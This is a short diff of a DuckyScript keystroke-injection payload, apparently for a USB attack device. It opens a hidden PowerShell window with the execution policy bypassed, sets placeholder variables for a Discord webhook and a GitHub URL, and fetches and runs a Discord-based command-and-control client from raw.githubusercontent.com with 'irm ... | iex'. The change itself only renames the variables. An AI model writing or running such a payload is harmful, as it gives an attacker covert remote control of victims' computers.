@@ -14,7 +14,7 @@ DELAY 750
 STRING powershell -NoP -Ep Bypass -W H
 ENTER
 DELAY 5000
-STRING $dc='WEBHOOK_HERE'; $gh='YOUR_GITHUB_FILE_URL_HERE';
+STRING $hookurl = 'WEBHOOK_HERE'; $ghurl = 'GITHUB_URL_HERE'; 
 STRING irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex
 ENTER
 
